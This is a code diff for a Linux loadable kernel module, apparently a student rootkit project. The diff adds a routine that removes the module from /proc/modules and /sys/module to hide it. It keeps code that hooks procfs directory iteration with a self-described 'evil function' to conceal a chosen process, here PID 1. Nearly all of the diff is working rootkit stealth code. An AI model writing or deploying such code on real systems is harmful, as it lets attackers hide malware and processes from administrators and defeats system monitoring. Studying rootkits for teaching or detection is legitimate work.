@@ -12,10 +12,10 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("CSEN1001");
 MODULE_VERSION("1.0");
 
-static int __init phide_init(void);
-static void __exit phide_exit(void);
+static int __init lkm_init(void);
+static void __exit lkm_exit(void);
 
-static char *proc_to_hide = "";
+static char *proc_to_hide = "1";
 static struct file_operations proc_fops;
 static struct file_operations *backup_proc_fops;
 static struct inode *proc_inode;
@@ -55,31 +55,51 @@ int rk_iterate_shared(struct file *file, struct dir_context *ctx)
 // Main Functions                  #
 // #################################
 
-static int __init phide_init(void)
+static int mhide(void)
 {
-    if (proc_to_hide[0] == '\0')                    // check if proc is set
-    {
-        printk(KERN_INFO "ProcHide: LKM can not be loaded, \'proc_to_hid\' is not set!\n");
-        phide_exit();
-        return ESRCH;                               // error ESRCH: no such process
-    }
+    // remove module from `/proc/modules` list
+    list_del_init(&__this_module.list);
 
-    printk(KERN_INFO "ProcHide: LKM succefully loaded!\n");
-
-    if (kern_path("/proc", 0, &p))                  // fetch the procfs entry
-        return ENOENT;                              // error ENOENT: no such file or directory
-
-    proc_inode = p.dentry->d_inode;                 // get the inode
-
-    proc_fops = *proc_inode->i_fop;                 // get a copy of file_operations from inode
-    backup_proc_fops = proc_inode->i_fop;           // backup the file_operations
-    proc_fops.iterate_shared = rk_iterate_shared;   // modify the copy with out evil function
-    proc_inode->i_fop = &proc_fops;                 // overwrite the active file_operations
+    // remove module from `/sys/module` list
+    kobject_del(&THIS_MODULE->mkobj.kobj);
 
     return 0;
 }
 
-static void __exit phide_exit(void)
+static int phide(void)
+{
+    if (proc_to_hide[0] == '\0') // check if proc is set
+    {
+        printk(KERN_INFO "LKM: LKM can not be loaded, \'proc_to_hid\' is not set!\n");
+        lkm_exit();
+        return ESRCH; // error ESRCH: no such process
+    }
+
+    printk(KERN_INFO "LKM: LKM succefully loaded!\n");
+
+    if (kern_path("/proc", 0, &p)) // fetch the procfs entry
+        return ENOENT;             // error ENOENT: no such file or directory
+
+    proc_inode = p.dentry->d_inode; // get the inode
+
+    proc_fops = *proc_inode->i_fop;               // get a copy of file_operations from inode
+    backup_proc_fops = proc_inode->i_fop;         // backup the file_operations
+    proc_fops.iterate_shared = rk_iterate_shared; // modify the copy with out evil function
+    proc_inode->i_fop = &proc_fops;               // overwrite the active file_operations
+
+    return 0;
+}
+
+static int __init lkm_init(void)
+{
+    mhide();
+
+    phide();
+
+    return 0;
+}
+
+static void __exit lkm_exit(void)
 {
     if (kern_path("/proc", 0, &p))
         return;
@@ -88,8 +108,8 @@ static void __exit phide_exit(void)
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
 
-    printk(KERN_INFO "ProcHide: LKM succefully unloaded!\n");
+    printk(KERN_INFO "LKM: LKM succefully unloaded!\n");
 }
 
-module_init(phide_init);
-module_exit(phide_exit);
+module_init(lkm_init);
+module_exit(lkm_exit);
